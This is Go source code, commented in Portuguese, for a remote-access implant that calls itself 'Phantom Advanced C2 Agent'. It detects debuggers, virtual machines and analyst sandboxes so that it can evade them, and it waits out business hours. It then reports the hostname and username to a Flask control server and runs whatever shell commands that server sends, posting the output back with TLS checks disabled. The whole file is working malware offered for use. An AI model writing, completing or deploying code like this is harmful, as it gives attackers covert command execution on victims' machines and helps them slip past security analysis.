package main

import (
    "bytes"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strings"
    "time"
)

// Configurações para conectar ao seu servidor Flask
var (
    flaskURL = "https://your-replit-server.replit.app"  // Atualize com sua URL
    uuid     = generateUUID()
)

// Estruturas para comunicação com Flask
type StatusReport struct {
    Hostname string `json:"hostname"`
    Username string `json:"username"`
    IP       string `json:"ip"`
    OS       string `json:"os"`
    Time     int64  `json:"time"`
}

type CommandRequest struct {
    Hostname string `json:"hostname"`
}

type CommandResponse struct {
    Command string `json:"command"`
}

type OutputReport struct {
    Hostname string `json:"hostname"`
    Command  string `json:"command"`
    Output   string `json:"output"`
    Time     int64  `json:"time"`
}

type HeartbeatReport struct {
    Hostname string `json:"hostname"`
    Time     int64  `json:"time"`
}

// Técnicas de evasão avançadas
func antiDebugCheck() bool {
    if runtime.GOOS == "linux" {
        // Verificar TracerPid
        status, err := ioutil.ReadFile("/proc/self/status")
        if err == nil {
            statusStr := string(status)
            lines := strings.Split(statusStr, "\n")
            for _, line := range lines {
                if strings.HasPrefix(line, "TracerPid:") {
                    parts := strings.Fields(line)
                    if len(parts) > 1 && parts[1] != "0" {
                        return true // Debugger detectado
                    }
                }
            }
        }
    }
    return false
}

func vmDetection() bool {
    // Lista de arquivos para verificar
    vmFiles := []string{
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/board_vendor",
        "/proc/cpuinfo",
    }
    
    vmIndicators := []string{
        "vmware", "virtualbox", "qemu", "kvm", "xen", 
        "hyper-v", "virtual", "bochs", "parallels",
    }
    
    for _, path := range vmFiles {
        if data, err := ioutil.ReadFile(path); err == nil {
            content := strings.ToLower(string(data))
            for _, indicator := range vmIndicators {
                if strings.Contains(content, indicator) {
                    fmt.Printf("[!] VM indicator detected: %s in %s\n", indicator, path)
                    return true
                }
            }
        }
    }
    
    // Verificar hostname suspeito
    hostname, _ := os.Hostname()
    hostname = strings.ToLower(hostname)
    suspiciousNames := []string{
        "sandbox", "analysis", "malware", "virus", "test", 
        "vm", "virtual", "lab", "research",
    }
    
    for _, name := range suspiciousNames {
        if strings.Contains(hostname, name) {
            fmt.Printf("[!] Suspicious hostname detected: %s\n", hostname)
            return true
        }
    }
    
    return false
}

func sandboxEvasion() bool {
    // Verificar usuários suspeitos
    user := os.Getenv("USER")
    if user == "" {
        user = os.Getenv("USERNAME")
    }
    user = strings.ToLower(user)
    
    sandboxUsers := []string{
        "sandbox", "malware", "virus", "sample", "test",
        "analyst", "reversing", "lab", "research",
    }
    
    for _, sbUser := range sandboxUsers {
        if strings.Contains(user, sbUser) {
            fmt.Printf("[!] Suspicious user detected: %s\n", user)
            return true
        }
    }
    
    // Verificar uptime (sistemas com uptime muito baixo podem ser sandboxes)
    if uptime, err := ioutil.ReadFile("/proc/uptime"); err == nil {
        uptimeStr := strings.Fields(string(uptime))[0]
        if len(uptimeStr) > 0 && uptimeStr[0] == '0' {
            // Uptime muito baixo
            fmt.Println("[!] Very low uptime detected")
            return true
        }
    }
    
    return false
}

func temporalEvasion() {
    now := time.Now()
    hour := now.Hour()
    weekday := now.Weekday()
    
    // Só opera em horário comercial
    if weekday == time.Saturday || weekday == time.Sunday || hour < 9 || hour > 17 {
        sleepTime := time.Duration(30+rand.Intn(60)) * time.Minute
        fmt.Printf("[!] Fora do horário comercial. Dormindo por %v\n", sleepTime)
        time.Sleep(sleepTime)
    }
}

func main() {
    rand.Seed(time.Now().UnixNano())
    
    fmt.Println("[+] Phantom Advanced C2 Agent")
    fmt.Println("[+] Target: Flask C2 Server")
    fmt.Println("[+] Iniciando verificações de evasão...")
    
    // Verificações de evasão
    if antiDebugCheck() {
        fmt.Println("[-] Debugger detectado. Encerrando.")
        os.Exit(0)
    }
    
    if vmDetection() {
        fmt.Println("[!] Ambiente virtualizado detectado. Aplicando delay...")
        delay := time.Duration(60+rand.Intn(120)) * time.Second
        time.Sleep(delay)
    }
    
    if sandboxEvasion() {
        fmt.Println("[-] Ambiente suspeito detectado. Encerrando.")
        os.Exit(0)
    }
    
    // Evasão temporal
    temporalEvasion()
    
    fmt.Println("[+] Verificações concluídas. Iniciando operação...")
    
    // Checkin inicial
    if !checkin() {
        fmt.Println("[-] Falha no checkin inicial")
        os.Exit(1)
    }
    
    fmt.Println("[+] Checkin realizado com sucesso!")
    fmt.Println("[+] Agente operacional. Entrando em loop principal...")
    
    // Loop principal
    for {
        // Verificar por comandos
        command := getCommand()
        if command != "" {
            fmt.Printf("[+] Comando recebido: %s\n", command)
            
            // Comandos especiais
            if command == "exit" {
                fmt.Println("[+] Comando de saída recebido. Encerrando.")
                break
            }
            
            // Executar comando
            output := executeCommand(command)
            sendOutput(command, output)
        }
        
        // Enviar heartbeat
        sendHeartbeat()
        
        // Sleep com jitter
        sleepWithJitter()
    }
}

func checkin() bool {
    client := createHTTPClient()
    
    hostname, _ := os.Hostname()
    user := os.Getenv("USER")
    if user == "" {
        user = os.Getenv("USERNAME")
    }
    
    report := StatusReport{
        Hostname: hostname,
        Username: user,
        IP:       getLocalIP(),
        OS:       runtime.GOOS,
        Time:     time.Now().Unix(),
    }
    
    jsonData, _ := json.Marshal(report)
    
    resp, err := client.Post(flaskURL+"/api/report_status", 
                            "application/json", 
                            bytes.NewBuffer(jsonData))
    if err != nil {
        fmt.Printf("[-] Erro no checkin: %v\n", err)
        return false
    }
    defer resp.Body.Close()
    
    return resp.StatusCode == 200
}

func getCommand() string {
    client := createHTTPClient()
    hostname, _ := os.Hostname()
    
    resp, err := client.Get(fmt.Sprintf("%s/api/get_command?hostname=%s", flaskURL, hostname))
    if err != nil {
        return ""
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    
    var cmdResp CommandResponse
    if err := json.Unmarshal(body, &cmdResp); err != nil {
        return ""
    }
    
    return cmdResp.Command
}

func executeCommand(command string) string {
    var cmd *exec.Cmd
    
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/C", command)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command)
    }
    
    output, err := cmd.Output()
    if err != nil {
        return fmt.Sprintf("Erro: %v", err)
    }
    
    return string(output)
}

func sendOutput(command, output string) {
    client := createHTTPClient()
    hostname, _ := os.Hostname()
    
    report := OutputReport{
        Hostname: hostname,
        Command:  command,
        Output:   output,
        Time:     time.Now().Unix(),
    }
    
    jsonData, _ := json.Marshal(report)
    
    client.Post(flaskURL+"/api/report_output", 
               "application/json", 
               bytes.NewBuffer(jsonData))
}

func sendHeartbeat() {
    client := createHTTPClient()
    hostname, _ := os.Hostname()
    
    heartbeat := HeartbeatReport{
        Hostname: hostname,
        Time:     time.Now().Unix(),
    }
    
    jsonData, _ := json.Marshal(heartbeat)
    
    client.Post(flaskURL+"/api/heartbeat", 
               "application/json", 
               bytes.NewBuffer(jsonData))
}

func createHTTPClient() *http.Client {
    return &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        Timeout: 10 * time.Second,
    }
}

func getLocalIP() string {
    return "127.0.0.1" // Simplificado para o exemplo
}

func generateUUID() string {
    b := make([]byte, 16)
    for i := range b {
        b[i] = byte(rand.Intn(256))
    }
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func sleepWithJitter() {
    base := 5 * time.Second
    jitter := time.Duration(rand.Intn(3000)) * time.Millisecond
    time.Sleep(base + jitter)
}